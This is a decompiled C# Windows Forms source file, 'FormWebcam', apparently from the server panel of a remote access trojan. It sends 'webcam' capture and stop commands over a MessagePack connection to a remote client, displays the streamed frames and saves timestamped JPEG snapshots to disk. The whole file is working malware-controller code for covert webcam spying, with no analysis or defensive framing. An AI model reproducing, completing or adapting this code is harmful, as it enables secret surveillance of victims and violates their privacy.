﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x0200009E RID: 158
	public partial class FormWebcam : Form
	{
		// Token: 0x170000DE RID: 222
		// (get) Token: 0x060004E7 RID: 1255 RVA: 0x0000494B File Offset: 0x00002B4B
		// (set) Token: 0x060004E8 RID: 1256 RVA: 0x00004953 File Offset: 0x00002B53
		public Form1 F { get; set; }

		// Token: 0x170000DF RID: 223
		// (get) Token: 0x060004E9 RID: 1257 RVA: 0x0000495C File Offset: 0x00002B5C
		// (set) Token: 0x060004EA RID: 1258 RVA: 0x00004964 File Offset: 0x00002B64
		internal Clients Client { get; set; }

		// Token: 0x170000E0 RID: 224
		// (get) Token: 0x060004EB RID: 1259 RVA: 0x0000496D File Offset: 0x00002B6D
		// (set) Token: 0x060004EC RID: 1260 RVA: 0x00004975 File Offset: 0x00002B75
		internal Clients ParentClient { get; set; }

		// Token: 0x170000E1 RID: 225
		// (get) Token: 0x060004ED RID: 1261 RVA: 0x0000497E File Offset: 0x00002B7E
		// (set) Token: 0x060004EE RID: 1262 RVA: 0x00004986 File Offset: 0x00002B86
		public string FullPath { get; set; }

		// Token: 0x170000E2 RID: 226
		// (get) Token: 0x060004EF RID: 1263 RVA: 0x0000498F File Offset: 0x00002B8F
		// (set) Token: 0x060004F0 RID: 1264 RVA: 0x00004997 File Offset: 0x00002B97
		public Image GetImage { get; set; }

		// Token: 0x060004F1 RID: 1265 RVA: 0x000049A0 File Offset: 0x00002BA0
		public FormWebcam()
		{
			this.InitializeComponent();
		}

		// Token: 0x060004F2 RID: 1266 RVA: 0x00031ABC File Offset: 0x0002FCBC
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.button1.Tag == "play")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack.ForcePathObject("Command").AsString = "capture";
					msgPack.ForcePathObject("List").AsInteger = (long)this.comboBox1.SelectedIndex;
					msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					this.button1.Tag = "stop";
					this.button1.BackgroundImage = Resources.stop__1_;
					this.numericUpDown1.Enabled = false;
					this.comboBox1.Enabled = false;
					this.btnSave.Enabled = true;
				}
				else
				{
					this.button1.Tag = "play";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack2.ForcePathObject("Command").AsString = "stop";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
					this.button1.BackgroundImage = Resources.play_button;
					this.btnSave.BackgroundImage = Resources.save_image;
					this.numericUpDown1.Enabled = true;
					this.comboBox1.Enabled = true;
					this.btnSave.Enabled = false;
					this.timerSave.Stop();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060004F3 RID: 1267 RVA: 0x00031C80 File Offset: 0x0002FE80
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060004F4 RID: 1268 RVA: 0x00031CD4 File Offset: 0x0002FED4
		private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x060004F5 RID: 1269 RVA: 0x00031D08 File Offset: 0x0002FF08
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.SaveIt)
				{
					this.SaveIt = false;
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
				this.SaveIt = true;
			}
		}

		// Token: 0x060004F6 RID: 1270 RVA: 0x00031D98 File Offset: 0x0002FF98
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}

		// Token: 0x04000416 RID: 1046
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x04000417 RID: 1047
		public int FPS;

		// Token: 0x04000418 RID: 1048
		public bool SaveIt;
	}
}
